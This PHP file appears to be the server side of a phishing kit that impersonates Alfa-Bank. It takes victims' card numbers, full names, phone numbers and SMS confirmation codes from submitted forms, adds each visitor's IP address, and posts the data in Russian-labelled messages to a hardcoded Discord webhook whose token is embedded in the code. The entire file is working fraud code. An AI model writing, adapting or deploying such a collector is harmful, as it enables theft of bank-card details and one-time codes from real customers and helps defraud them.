<?php

  function send_message($text) {
    $webhook = 'https://discord.com/api/webhooks/1544994017886998559/noa3HDoMaS71iZ0PXPSpHlAmXxugOUuFkoDYj-QOjxddWNhWgjshV8GdDdOGdnal_FHy';

    $payload = [
        'content' => $text
    ];

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(
        $payload,
        JSON_UNESCAPED_UNICODE
    ));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    curl_exec($ch);
    curl_close($ch);
}


  function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = get_ip();

if($_POST['card']){
	
$card = $_POST['card'];
$fio = $_POST['fio'];
$phone = $_POST['phone'];

$txt = "
🅰️ <b>Альфа-Банк</b>
🅰️ <b>IP</b> : $ip
🅰️ <b>ФИО</b> : $fio
🅰️ <b>Номер карты</b> : $card
🅰️ <b>Номер телефона</b> : $phone
";

send_message($txt);
	
}


if($_POST['sms']){
  
$sms = $_POST['sms'];

$txt = "
🅰️ <b>Альфа-Банк</b>
🅰️ <b>IP</b> : $ip
🅰️ <b>SMS</b> : $sms
";

send_message($txt);
  
}

